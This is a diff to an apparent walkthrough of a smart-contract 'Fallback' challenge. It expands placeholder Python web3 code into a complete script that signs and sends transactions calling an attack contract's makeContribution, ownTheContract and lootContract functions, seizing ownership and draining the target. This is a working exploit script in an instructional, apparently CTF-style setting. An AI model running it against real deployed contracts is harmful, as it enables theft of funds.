@@ -230,20 +230,56 @@ We deploy the `fallback_attack.sol` contract, we then call the `makeContribution
 ```python
 # use the address you deployed ur
 # attack contract at
-contract_addr = '0x1234567890'
+contract_addr = '0x10D409B3962f5F49Dc5Ac2039bcFe06F722cfc22'
 
-contract_abi = '[{ the attack contract abi here }]'
+contract_abi = '[{"inputs": [],"name": "lootContract","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "makeContribution","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "ownTheContract","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "fallbackContractAddress","type": "address"}],"stateMutability": "nonpayable","type": "constructor"},{"stateMutability": "payable","type": "receive"},{"inputs": [],"name": "fallbackContract","outputs": [{"internalType": "contract Fallback","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "getContribution","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"}]'
+
 
 attack_contract = g_net.eth.contract(address=contract_addr, abi=contract_abi)
 
-# call the makeContribution() function
-attack_contract.functions.makeContribution().transact()
+# your account whose private key will be used to sign the txn
+my_account = "0x1234567890123456789012345678901234567890"
 
-# call the ownTheContract() function
-attack_contract.functions.ownTheContract().transact()
+# your account's private key here
+key = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
 
-# call the lootContract() function
-attack_contract.functions.lootContract().transact()
+nonce = lambda: g_net.eth.get_transaction_count(my_account)
+
+# prepare makeContribution() txn
+mc_txn = attack_contract.functions.makeContribution().build_transaction()
+mc_txn['nonce'] = nonce()
+
+# sign the txn
+signed_mc_txn = g_net.eth.account.sign_transaction(mc_txn, key)
+
+# send the txn
+g_net.eth.send_raw_transaction(signed_mc_txn.rawTransaction)
+
+# prepare ownTheContract() txn
+otc_txn = attack_contract.functions.ownTheContract().build_transaction({
+    'nonce': nonce(),
+    'gas': 1000000,
+    'gasPrice': g_net.eth.gas_price,
+})
+
+# sign the txn
+signed_otc_txn = g_net.eth.account.sign_transaction(otc_txn, key)
+
+# send the txn
+g_net.eth.send_raw_transaction(signed_otc_txn.rawTransaction)
+
+# prepare lootContract() txn
+lc_txn = attack_contract.functions.lootContract().build_transaction({
+    'nonce': nonce(),
+    'gas': 1000000,
+    'gasPrice': g_net.eth.gas_price,
+})
+
+# sign the txn
+signed_lc_txn = g_net.eth.account.sign_transaction(lc_txn, key)
+
+# send the txn
+g_net.eth.send_raw_transaction(signed_lc_txn.rawTransaction)
 
 ```
 
